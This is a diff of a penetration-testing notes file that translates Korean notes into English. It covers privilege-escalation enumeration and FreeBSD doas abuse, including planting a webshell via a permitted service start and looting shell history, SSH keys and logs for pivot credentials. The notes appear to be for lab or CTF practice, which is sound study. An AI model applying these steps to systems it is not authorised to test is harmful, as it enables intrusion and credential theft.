-3. 내부 서비스 확인 — `ss -tulnp` 로 localhost 전용 서비스. 외부 스캔에 안 보이고 root로 도는 경우가 많다.
-4. 실행 중인 프로세스 확인 — `ps aux` 로 root가 도는 흥미로운 인자의 서비스. 일시적 프로세스는 `pspy64` 로 잡는다.
-5. 새 맥락으로 재열거 — 유저명, 패스워드, 서비스명 등 새 정보를 찾을 때마다 표적 검색 재실행.
+1. Check non-default directories at the filesystem root — use `ls /` to find unusual entries like `/opt/`, `/srv/`, `/backup/`, or custom directories. Things placed there on purpose have a reason.
+2. Read every file you can access — especially home directories, web roots, and config files. Password-protected files are high value (crack them).
+3. Check internal services — `ss -tulnp` for localhost-only services. They're often invisible to external scans and run as root.
+4. Check running processes — `ps aux` for root-run services with interesting arguments. Catch transient processes with `pspy64`.
+5. Re-enumerate with new context — every time you find a new username, password, or service name, re-run targeted searches.
 
-privesc은 익스플로잇보다 정보 기반이라면: 파일 발견 → 크랙 → 읽기 → 숨은 서비스 발견 → 사용. 자동 도구는 설정 오류를 찾지, 정보 수집은 하지 않는다.
+If privesc is information-driven: find a file → crack it → read it → discover a hidden service → use it. Automated tools find misconfigurations; they don't gather information.
 
-## FreeBSD 권한 상승
+## FreeBSD privilege escalation
 
-FreeBSD는 sudo 대신 doas를 쓴다. 설정은 /usr/local/etc/doas.conf.
+FreeBSD uses doas instead of sudo. The config lives in /usr/local/etc/doas.conf.
 
-### 인식
+### Recognition
 
-- `uname -a` 에 FreeBSD 표시
-- 서드파티 설정 디렉터리는 /etc/ 가 아니라 /usr/local/etc/
-- 서비스 관리는 `service NAME onestart/onestop/restart`
-- 패키지 매니저는 apt 대신 pkg
-- 섀도 파일은 /etc/shadow 대신 /etc/master.passwd
+- `uname -a` shows FreeBSD
+- Third-party config directories are under /usr/local/etc/, not /etc/
+- Service management is `service NAME onestart/onestop/restart`
+- Package manager is pkg, not apt
+- The shadow file is /etc/master.passwd instead of /etc/shadow
 
-### 열거
+### Enumeration
 
 ```bash
 cat /usr/local/etc/doas.conf
@@ -703,17 +703,17 @@ ls /usr/local/etc/rc.d/
 find /usr/local/etc/ -writable 2>/dev/null
 ```
 
-### 악용: doas service 남용
+### Exploitation: doas service abuse
 
-doas.conf에 `permit nopass USER cmd service args X onestart` 형태가 있으면:
+If doas.conf has a line of the form `permit nopass USER cmd service args X onestart`:
 
-1. 서비스 바이너리 / 설정 / Include 디렉터리의 쓰기 가능 확인
-2. 서비스 설정이 쓰기 가능한 디렉터리의 파일을 include하는지 확인 (메인 conf에서 Include grep)
-3. 웹 서비스면 DocumentRoot에 웹셸을 두고 doas로 서비스 시작 → 서비스 유저로 쉘 수신
+1. Check writability of the service binary / config / Include directories
+2. Check whether the service config includes files from a writable directory (grep the main conf for Include)
+3. If it's a web service, place a webshell in the DocumentRoot, start the service via doas → catch a shell as the service user
 
-실전 사례: Apache는 root가 아닌 www 유저로 실행됐고 httpd.conf와 Includes 디렉터리는 읽기 전용이었다. 진짜 가치는 post-exploit looting에서 FILES 공유를 가리키는 sshpass 명령이 .history에서 발견된 것.
+Real-world case: Apache ran as the non-root www user, and httpd.conf and the Includes directory were read-only. The real value was in post-exploit looting: an sshpass command pointing at the FILES share was found in .history.
 
-교훈: doas 남용으로 깔끔한 privesc이 안 나오면, 가치는 다음 머신 피벗 creds을 위한 열거에 있다. .history, .bash_history, /home/*/.ssh, /var/mail, /tmp, /var/log 을 뒤진다.
+Lesson: if doas abuse doesn't yield a clean privesc, the value is in enumeration for pivot creds for the next machine. Search .history, .bash_history, /home/*/.ssh, /var/mail, /tmp, and /var/log.
 
 ### FreeBSD Post-Exploit Looting
 
